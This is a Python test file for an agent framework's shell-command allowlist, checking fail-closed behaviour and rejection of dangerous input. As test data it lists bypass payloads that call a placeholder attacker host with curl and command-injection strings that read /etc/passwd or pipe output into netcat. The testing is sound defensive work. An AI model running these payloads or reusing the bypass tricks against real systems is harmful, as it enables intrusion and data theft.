"""Security corpus for ShellTool allowlist (S1-05)."""

from __future__ import annotations

import os
import sys
from pathlib import Path
from unittest.mock import patch

import pytest
from agentic_v2.tools.builtin.shell_ops import ShellExecTool, ShellTool

# ---------------------------------------------------------------------------
# Fail-closed: no env var
# ---------------------------------------------------------------------------


async def test_fail_closed_when_allowlist_unset():
    env = {k: v for k, v in os.environ.items() if k != "AGENTIC_SHELL_ALLOWED_COMMANDS"}
    with patch.dict(os.environ, env, clear=True):
        tool = ShellTool()
        result = await tool.execute("ls")
    assert result.success is False
    assert "AGENTIC_SHELL_ALLOWED_COMMANDS" in result.error


async def test_shell_exec_fail_closed_when_allowlist_unset(tmp_path):
    env = {k: v for k, v in os.environ.items() if k != "AGENTIC_SHELL_ALLOWED_COMMANDS"}
    with patch.dict(os.environ, env, clear=True):
        tool = ShellExecTool()
        result = await tool.execute(
            "python", ["-c", "print('blocked')"], cwd=str(tmp_path)
        )
    assert result.success is False
    assert "AGENTIC_SHELL_ALLOWED_COMMANDS" in result.error


# ---------------------------------------------------------------------------
# Allowlist enforcement
# ---------------------------------------------------------------------------


async def test_allowed_command_executes(tmp_path):
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "echo"}):
        tool = ShellTool()
        result = await tool.execute("echo hello", cwd=str(tmp_path))
    assert result.success is True


async def test_disallowed_command_rejected(tmp_path):
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "ls"}):
        tool = ShellTool()
        result = await tool.execute("curl http://example.com", cwd=str(tmp_path))
    assert result.success is False
    assert "curl" in result.error


async def test_shell_exec_disallowed_program_rejected(tmp_path):
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "ls"}):
        tool = ShellExecTool()
        result = await tool.execute(
            "python", args=["-c", "print('hello')"], cwd=str(tmp_path)
        )
    assert result.success is False
    assert "python" in result.error
    assert "allowlist" in result.error


async def test_shell_exec_allowed_program_executes(tmp_path):
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "python"}):
        tool = ShellExecTool()
        result = await tool.execute(
            "python", args=["-c", "print('hello')"], cwd=str(tmp_path)
        )
    assert result.success is True
    assert "hello" in result.data["stdout"].lower()


async def test_shell_exec_absolute_path_rejected_by_basename(tmp_path):
    python_exe = sys.executable
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "not-python"}):
        tool = ShellExecTool()
        result = await tool.execute(
            python_exe, args=["-c", "print('blocked')"], cwd=str(tmp_path)
        )
    assert result.success is False
    assert Path(python_exe).stem.lower() in result.error
    assert "allowlist" in result.error


async def test_shell_exec_dotted_program_name_not_truncated(tmp_path):
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "python3"}):
        tool = ShellExecTool()
        result = await tool.execute(
            "python3.11", args=["-c", "print('blocked')"], cwd=str(tmp_path)
        )
    assert result.success is False
    assert "python3.11" in result.error
    assert "allowlist" in result.error


async def test_shell_exec_script_extension_not_allowed_by_stem(tmp_path):
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "foo"}):
        tool = ShellExecTool()
        result = await tool.execute("foo.sh", args=[], cwd=str(tmp_path))
    assert result.success is False
    assert "foo.sh" in result.error
    assert "allowlist" in result.error


async def test_shell_exec_dangerous_rm_rf_root_blocked_when_allowlisted(tmp_path):
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "rm"}):
        tool = ShellExecTool()
        result = await tool.execute("rm", args=["-rf", "/"], cwd=str(tmp_path))
    assert result.success is False
    assert "Dangerous shell command blocked" in result.error


# ---------------------------------------------------------------------------
# Bypass corpus — all must be rejected without 'curl' in allowlist
# ---------------------------------------------------------------------------

_CURL_BYPASS_ATTEMPTS = [
    "curl  http://evil.com",  # double-space
    "/usr/bin/curl http://evil.com",  # absolute path
    "CURL http://evil.com",  # uppercase
    "ｃｕｒｌ http://evil.com",  # noqa: RUF001 — intentional fullwidth bypass payload
]


@pytest.mark.parametrize("cmd", _CURL_BYPASS_ATTEMPTS)
async def test_blocklist_bypass_corpus_rejected(cmd: str, tmp_path):
    """Without 'curl' in the allowlist, all bypass attempts must be rejected."""
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "ls,echo"}):
        tool = ShellTool()
        result = await tool.execute(cmd, cwd=str(tmp_path))
    assert result.success is False


# ---------------------------------------------------------------------------
# Metachar corpus — rejected by _split_command before allowlist check
# ---------------------------------------------------------------------------

_METACHAR_CORPUS = [
    "ls; cat /etc/passwd",
    "ls && curl http://evil.com",
    "ls | nc -l 4444",
    "ls `id`",
    "ls $(id)",
    "ls > /tmp/out",
    "ls < /dev/null",
]


@pytest.mark.parametrize("cmd", _METACHAR_CORPUS)
async def test_metachar_corpus_rejected(cmd: str, tmp_path):
    """Shell metacharacters must be rejected regardless of allowlist."""
    with patch.dict(os.environ, {"AGENTIC_SHELL_ALLOWED_COMMANDS": "ls,cat,curl"}):
        tool = ShellTool()
        result = await tool.execute(cmd, cwd=str(tmp_path))
    assert result.success is False
